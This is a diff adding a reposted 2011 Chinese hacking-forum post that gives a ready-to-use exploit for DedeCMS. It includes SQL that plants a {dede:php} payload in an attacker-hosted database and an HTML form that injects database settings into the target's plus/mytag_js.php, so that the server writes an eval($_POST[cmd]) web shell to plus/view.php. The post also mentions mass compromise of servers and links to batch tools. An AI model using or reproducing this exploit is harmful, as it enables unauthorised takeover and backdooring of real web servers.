@@ -1,0 +1,38 @@
+
+
+ZZ]DEDECMS exp
+本帖最后由 hornet 于 2011-8-12 21:18 编辑 
+
+ZZz:http://t00ls.net/thread-17355-1-1.html
+
+估計大家抓了不少伺服器把 ,t00ls已有批量程式
+http://t00ls.net/viewthread.php?tid=17378&extra=&page=1
+
+
+準備好自己的dede數據庫
+create database dede;
+建表
+use dede;
+create dede_mytag(aid int,normbody VARCHAR(10000));
+插入：
+insert into dede_mytag(aid,normbody) values(1,'{dede:php}$fp = @fopen("view.php", \'a\');@fwrite($fp, \'<?php eval($_POST[cmd]); ?>\');echo "OK";@fclose($fp);{/dede:php}');
+用一下表單提交，shell位於plus目錄下 view.php
+http://localhost:8080/plus/mytag_js.php?aid=1改為實際地址
+ 
+
+<form action="" method="post" name="QuickSearch" id="QuickSearch">
+<input type="text" value="http://localhost:8080/plus/mytag_js.php?aid=1" name="doaction" style="width:400"><br />
+<input type="text" value="xx.xx.xx.xx" name="_COOKIE[GLOBALS][cfg_dbhost]" style="width:400"><br />
+<input type="text" value="root" name="_COOKIE[GLOBALS][cfg_dbuser]" style="width:400"><br />
+<input type="password" value="xxx80808" name="_COOKIE[GLOBALS][cfg_dbpwd]" style="width:400"><br />
+<input type="text" value="dede" name="_COOKIE[GLOBALS][cfg_dbname]" style="width:400"><br />
+<input type="text" value="dede_" name="_COOKIE[GLOBALS][cfg_dbprefix]" style="width:400"><br />
+<input type="text" value="true" name="nocache" style="width:400">
+<input type="submit" value="提交" name="QuickSearchBtn"><br />
+</form>
+<script>
+function addaction()
+{
+document.QuickSearch.action=document.QuickSearch.doaction.value;
+}
+</script>
